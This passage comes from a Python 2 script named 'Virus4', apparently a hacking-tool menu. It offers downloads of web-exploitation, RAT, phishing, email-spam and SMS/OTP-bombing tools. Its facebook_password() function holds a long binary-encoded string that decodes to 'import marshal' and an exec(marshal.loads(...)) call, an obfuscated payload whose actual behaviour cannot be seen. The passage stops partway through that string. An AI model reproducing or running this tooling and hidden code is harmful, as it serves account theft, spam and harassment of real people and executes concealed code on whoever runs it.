 print cyan +"    [23]download inther"
 time.sleep(0.05)
 print cyan +"    [24]download Atlas"
 time.sleep(0.05)
 print cyan +"    [25]download MaxSubdoFinder\n"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "download/web_hacking"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      sqlmap()
 elif nember == '2' or nember == '02' :
      webdav()
 elif nember == '3' or nember == '03' :
      xGans()
 elif nember == '4' or nember == '04' :
      webmassploit()
 elif nember == '5' or nember == '05' :
      wpsploit()
 elif nember == '6' or nember == '06' :
      sqldump()
 elif nember == '7' or nember == '07' :
      websploit()
 elif nember == '8' or nember == '08' :
      sqlmate()
 elif nember == '9' or nember == '09' :
      sqlokmed()
 elif nember == '10' :
      zones()
 elif nember == '11' :
      xshell()
 elif nember == '12' :
      sh33ll()
 elif nember == '13' :
      xattacker()
 elif nember == '14' :
      xsstrike()
 elif nember == '15' :
      breacher()
 elif nember == '16' :
      owscan()
 elif nember == '17' :
      kodork()
 elif nember == '18' :
      apsca()
 elif nember == '19' :
      amox()
 elif nember == '20' :
	  fade()
 elif nember == '21' :
      auxile()
 elif nember == '22' :
      hpb()
 elif nember == '23' :
      inther()
 elif nember == '24' :
	  atlas()
 elif nember == '25' :
      maxsubdofinder()
 elif nember == '0' or nember == '00' :
      download()
 else :
      error()
      web_hacking()
       
def exploitation_tools():
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +"\n    [01]download Metasploit"
 time.sleep(0.05)
 print cyan +"    [02]download commix"
 time.sleep(0.05)
 print cyan +"    [03]download sqlmap"
 time.sleep(0.05)
 print cyan +"    [04]download Brutal"
 time.sleep(0.05)
 print cyan +"    [05]download A-Rat"
 time.sleep(0.05)
 print cyan +"    [06]download WPSploit"  
 time.sleep(0.05)
 print cyan +"    [07]download Websploit"
 time.sleep(0.05)
 print cyan +"    [08]download Routersploit"
 time.sleep(0.05)
 print cyan +"    [09]download BlackBox"
 time.sleep(0.05)
 print cyan +"    [10]download XAttacker"
 time.sleep(0.05)
 print cyan +"    [11]download TXTool"
 time.sleep(0.05)
 print cyan +"    [12]download MSF-Pg"
 time.sleep(0.05)
 print cyan +"    [13]download Binary Exploitation"
 time.sleep(0.05)
 print cyan +"    [14]download ASU\n"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "download/exploitation_tools"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      metasploit()
 elif nember == '2' or nember == '02' :
      commix()
 elif nember == '3' or nember == '03' :
      sqlmap()
 elif nember == '4' or nember == '04' :
      brutal()
 elif nember == '5' or nember == '05' :
      a_rat()
 elif nember == '6' or nember == '06' :
      wpsploit()
 elif nember == '7' or nember == '07' :
      websploit()
 elif nember == '8' or nember == '08' :
      routersploit()
 elif nember == '9' or nember == '09' :
      blackbox()
 elif nember == '10' :
      xattacker()
 elif nember == '11' :
      txtool()
 elif nember == '12' :
      msfpg()
 elif nember == '13' :
      binploit()
 elif nember == '14' :
      asu()
 elif nember == '0' or nember == '00' :
      download()
 else :
      error()
      exploitation_tools()
 
def sniffing():
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +"\n    [01]download KnockMail"
 time.sleep(0.05)
 print cyan +"    [02]download Spammer-Grab"
 time.sleep(0.05)
 print cyan +"    [03]download Hac"
 time.sleep(0.05)
 print cyan +"    [04]download Spammer-Email"
 time.sleep(0.05)
 print cyan +"    [05]download SocialFish"
 time.sleep(0.05)
 print cyan +"    [06]download santet-online"
 time.sleep(0.05)
 print cyan +"    [07]download SpazSMS"
 time.sleep(0.05)
 print cyan +"    [08]download LiteOTP"
 time.sleep(0.05)
 print cyan +"    [09]download ASU\n"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "download/sniffing_and_spoofing"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      knockmail()
 elif nember == '2' or nember == '02' :
      spammer_grab()
 elif nember == '3' or nember == '03' :
      hac()
 elif nember == '4' or nember == '04' :
      spammer_email()
 elif nember == '5' or nember == '05' :
      socfish()
 elif nember == '6' or nember == '06' :
      sanlen()
 elif nember == '7' or nember == '07' :
      spazsms()
 elif nember == '8' or nember == '08' :
      liteotp()
 elif nember == '9' or nember == '09' :
      asu()
 elif nember == '0' or nember == '00' :
      download()
 else :
      error()
      sniffing()

 
def download():
     print red +"                                          [0]back"
     time.sleep(0.05)
     print ""
     print cyan +"   [01] Information Gathering"
     time.sleep(0.05)
     print cyan +"   [02] Vulnerability Scanner"
     time.sleep(0.05)
     print cyan +"   [03] Stress Testing"
     time.sleep(0.05)
     print cyan +"   [04] Password Attacks"
     time.sleep(0.05)
     print cyan +"   [05] Web Hacking"
     time.sleep(0.05)
     print cyan +"   [06] Exploitation Tools"
     time.sleep(0.05)
     print cyan +"   [07] Sniffing & Spoofing"
     time.sleep(0.05)
     print ''
     time.sleep(0.05)
     print ''
     time.sleep(0.05)
     print ''
     time.sleep(0.05)
     nember =raw_input("Virus4(" + red + "download"+ cyan + ") > ")
 
     if nember == '1' or nember == '01' :
         information_gathering()
     elif nember == '2' or nember == '02' :
         vulnerability_scanner()
     elif nember == '3' or nember == '03' :
         stress_testing()
     elif nember == '4' or nember == '04' :
         password_attacks()
     elif nember == '5' or nember == '05' :
         web_hacking()
     elif nember == '6' or nember == '06' :
         exploitation_tools()
     elif nember == '7' or nember == '07' :
         sniffing()
     elif nember == '0' or nember == '00' :
         Virus4()
     else :
         error()
         download()
	 
def facebook_password():
 code=txt="00001010011010010110110101110000011011110111001001110100001000000110110101100001011100100111001101101000011000010110110000001010011001010111100001100101011000110010100001101101011000010111001001110011011010000110000101101100001011100110110001101111011000010110010001110011001010000010011100100111001001110110001101011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011001101011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000001000000010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000011100110101110001111000011001010110010101011100011110000011000100110101010111000111100000110000001100000101110001111000001100000011000001100100010111000111100000110000001100000101110001111000001100000011000001011010010111000111100000110000001100000101110001111000001100000011000001100100010111000111100000110000001100010101110001111000001100000011000001100100010111000111100000110000001100100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100000011001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000000110100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110000001101010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100000011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000000110111010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001110100010111000111100000110000001100000101110001111000001100010011011101100100010111000110111001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000001100010010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110000011000110101110001111000001100000011000001011100011110000011000100110111011001000101110001110010010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110000011001010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100000110011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000100110000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110001001100010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100010011001001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000100110011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110001001101000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100010011010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000100110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110001001101110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100010011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000100111001010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110001011000010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100010110001001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000101100011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110001011001000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100010110010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000101100110010111000111100000110000001100000101110001111000001100010011011101100100001000000101110001111000001100000011000001011100011110000011000100110111011001000010000101011100011110000011000000110000010111000111100000110001001101110110010000100010010111000111100000110000001100000101110001111000001100010011011101100100001000110101110001111000001100000011000001011100011110000011000100110111011001000010010001011100011110000011000000110000010111000111100000110001001101110110010000100101010111000111100000110000001100000101110001111000001100010011011101100100001001100101110001111000001100000011000001011100011110000011000100110111011001000101110000100111010111000111100000110000001100000101110001111000001100010011011101100100001010000101110001111000001100000011000001011100011110000011000100110111011001000010100101011100011110000011000000110000010111000111100000110001001101110110010000101010010111000111100000110000001100000101110001111000001100010011011101100100001010110101110001111000001100000011000001011100011110000011000100110111011001000010110001011100011110000011000000110000010111000111100000110001001101110110010000101101010111000111100000110000001100000101110001111000001100010011011101100100001011100101110001111000001100000011000001011100011110000011000100110111011001000010111101011100011110000011000000110000010111000111100000110001001101110110010000110000010111000111100000110000001100000101110001111000001100010011011101100100001100010101110001111000001100000011000001011100011110000011000100110111011001000011001001011100011110000011000000110000010111000111100000110001001101110110010000110011010111000111100000110000001100000101110001111000001100010011011101100100001101000101110001111000001100000011000001011100011110000011000100110111011001000011010101011100011110000011000000110000010111000111100000110001001101110110010000110110010111000111100000110000001100000101110001111000001100010011011101100100001101110101110001111000001100000011000001011100011110000011000100110111011001000011100001011100011110000011000000110000010111000111100000110001001101110110010000111001010111000111100000110000001100000101110001111000001100010011011101100100001110100101110001111000001100000011000001011100011110000011000100110111011001000011101101011100011110000011000000110000010111000111100000110001001101110110010000111100010111000111100000110000001100000101110001111000001100010011011101100100001111010101110001111000001100000011000001011100011110000011000100110111011001000011111001011100011110000011000000110000010111000111100000110001001101110110010000111111010111000111100000110000001100000101110001111000001100010011011101100100010000000101110001111000001100000011000001011100011110000011000100110111011001000100000101011100011110000011000000110000010111000111100000110001001101110110010001000010010111000111100000110000001100000101110001111000001100010011011101100100010000110101110001111000001100000011000001011100011110000011000100110111011001000100010001011100011110000011000000110000010111000111100000110001001101110110010001000101010111000111100000110000001100000101110001111000001100010011011101100100010001100101110001111000001100000011000001011100011110000011000100110111011001000100011101011100011110000011000000110000010111000111100000110001001101110110010001001000010111000111100000110000001100000101110001111000001100010011011101100100010010010101110001111000001100000011000001011100011110000011000100110111011001000100101001011100011110000011000000110000010111000111100000110001001101110110010001001011010111000111100000110000001100000101110001111000001100010011011101100100010011000101110001111000001100000011000001011100011110000011000100110111011001000100110101011100011110000011000000110000010111000111100000110001001101110110010001001110010111000111100000110000001100000101110001111000001100010011011101100100010010100101110001111000001100000011000001011100011110000011000100110111011001000100111101011100011110000011000000110000010111000111100000110001001101110110010001010000010111000111100000110000001100000101110001111000001100010011011101100100010100010101110001111000001100000011000001011100011110000011000100110111011001000101001001011100011110000011000000110000010111000111100000110001001101110110010001010011010111000111100000110000001100000101110001111000001100010011011101100100010101000101110001111000001100000011000001011100011110000011000100110111011001000101010101011100011110000011000000110000010111000111100000110001001101110110010001010110010111000111100000110000001100000101110001111000001100010011011101100100010101110101110001111000001100000011000001011100011110000011000100110111011001000101100001011100011110000011000000110000010111000111100000110001001101110110010001011001010111000111100000110000001100000101110001111000001100010011011101100100010110100101110001111000001100000011000001011100011110000011000100110111011001000101101101011100011110000011000000110000010111000111100000110001001101110110010001011100010111000101110001111000001100000011000001011100011110000011000100110111011001000101110101011100011110000011000000110000010111000111100000110001001101110110010001011110010111000111100000110000001100000101110001111000001100010011011101100100010111110101110001111000001100000011000001011100011110000011000100110111011001000110000001011100011110000011000000110000010111000111100000110001001101110110010001011100010111000101110001111000001100000011000001011100011110000011000100110111011001000110000101011100011110000011000000110000010111000111100000110001001101110110010001100010010111000111100000110000001100000101110001111000001100010011011101100100011000110101110001111000001100000011000001011100011110000011000100110111011001000110010001011100011110000011000000110000010111000111100000110001001101110110010001011111010111000111100000110000001100000101110001111000001100010011011101100100011001010101110001111000001100000011000001011100011110000011000100110111011001000110011001011100011110000011000000110000010111000111100000110001001101110110010001100111010111000111100000110000001100000101110001111000001100010011011101100100011010000101110001111000001100000011000001011100011110000011000100110111011001000101111101011100011110000011000000110000010111000111100000110001001101110110010001100101010111000111100000110000001100000101110001111000001100010011011101100100011010010101110001111000001100000011000001011100011110000011000100110111011001000110101001011100011110000011000000110000010111000111100000110001001101110110010001101011010111000111100000110000001100000101110001111000001100010011011101100100011011000101110001111000001100000011000001011100011110000011000100110111011001000110110101011100011110000011000000110000010111000111100000110001001101110110010001101110010111000111100000110000001100000101110001111000001100010011011101100100011011110101110001111000001100000011000001011100011110000011000100110111011001000111000001011100011110000011000000110000010111000111100000110001001101110110010001110001010111000111100000110000001100000101110001111000001100010011011101100100010111110101110001111000001100000011000001011100011110000011000100110111011001000110010101011100011110000011000000110000010111000111100000110001001101110110010001110010010111000111100000110000001100000101110001111000001100010011011101100100011100110101110001111000001100000011000001011100011110000011000100110111011001000111010001011100011110000011000000110000010111000111100000110001001101110110010001110101010111000111100000110000001100000101110001111000001100010011011101100100011101100101110001111000001100000011000001011100011110000011000100110111011001000111011101011100011110000011000000110000010111000111100000110001001101110110010001111000010111000111100000110000001100000101110001111000001100010011011101100100011110010101110001111000001100000011000001011100011110000011000100110111011001000111101001011100011110000011000000110000010111000111100000110001001101110110010001111011010111000111100000110000001100000101110001111000001100010011011101100100011111000101110001111000001100000011000001011100011110000011000100110111011001000101110001011100010111000111100000110000001100000101110001111000001100010011011101100100011111010101110001111000001100000011000001011100011110000011000100110111011001000111111001011100011110000011000000110000010111000111100000110001001101110110010001110101010111000111100000110000001100000101110001111000001100010011011101100100011101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001101110110011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000110000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001100010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011001001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000110011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011011101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000110000101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100001100010010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000011000110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000110010001011100011110000011000000110000010111000111100000110001001101110110010000101011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000011001010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000110011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000110000101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100001100001010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001100010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110010010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001101010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110111010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011100101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100101100001010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001011000100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010110001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100101100100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001011001010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010110011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110000100110000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100001001100010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000010011001001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110000100110011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100001001101000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000010011010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110000100110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100001001101110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000010011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110000100111001010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100001011000010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000010110001001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110000101100011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100001011001000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010110001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100101100100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010110010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001101010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110000101100101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100001011001100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000100011000001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001000110001010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100010001100100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000100011001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001000110100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100010001101010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000100011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001000110111010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001011001010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010110011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100010001110010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000100110000101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001001100010010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100010011000110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000100110010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001001100101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100010011001100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100101100101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100011001100000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000110011000101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001100110010010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100011001100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000110011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001100110101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100011001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010110001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100101100100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010110010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001101010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001100110111010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100011001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000110011100101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001101100001010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100011011000100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001101100011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100010001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000100011011101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001011001010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000110110010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001101100101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100011011001100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001000011000001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010000110001010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100100001100100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001000011001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010000110100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100001001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001000011010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100101100101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100100001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001000011011101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100100001110010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001000110000101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100100011000100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001000110001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010001100100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010110010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100100011001010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000110110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100100011001100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010100110000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000011000010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001010011000101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010100110010010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100101001100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001010011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010100110101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100101001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010110001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010100110111010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000011000010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000110000101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010100111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001010011100101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110010011001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100101011000010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001010110001001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010101100011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100101011001000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001010110010101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010101100110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001100000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100000110001101011100011110000011000000110000010111000111100000110001001101110110010001011100011100100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001100011000101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110011000110010010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001100011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110011000110101010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001101100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001100011011101011100011110000011000000110000010111000111100000110001001101110110010000111100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001100011100101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110011001100001010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110011000100101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001100110001101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110011001100100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110011001010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001100110011001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000000110000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110000001100010101110001111000001100000011